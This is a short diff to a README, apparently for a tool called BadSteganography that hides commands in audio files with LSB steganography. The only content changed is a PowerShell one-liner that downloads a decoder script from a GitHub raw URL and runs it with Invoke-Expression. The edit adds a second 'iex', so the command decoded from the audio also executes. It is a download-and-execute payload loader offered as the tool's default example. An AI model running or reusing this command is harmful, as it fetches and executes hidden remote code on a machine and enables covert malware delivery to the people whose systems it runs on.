@@ -12,5 +12,5 @@ The steganography method used in the provided code is called “LSB (Least Signi
 # Example
 This default payload grabs the contents of the decoder, which then downloads the audio to memory, decodes the message, and executes the command with Invoke-Expression
 ```
-iex(iwr https://raw.githubusercontent.com/CharlesTheGreat77/BadSteganography/main/spread_spectrum_decode.txt).Content
+iex(iwr https://raw.githubusercontent.com/CharlesTheGreat77/BadSteganography/main/spread_spectrum_decode.txt).Content | iex
 ```
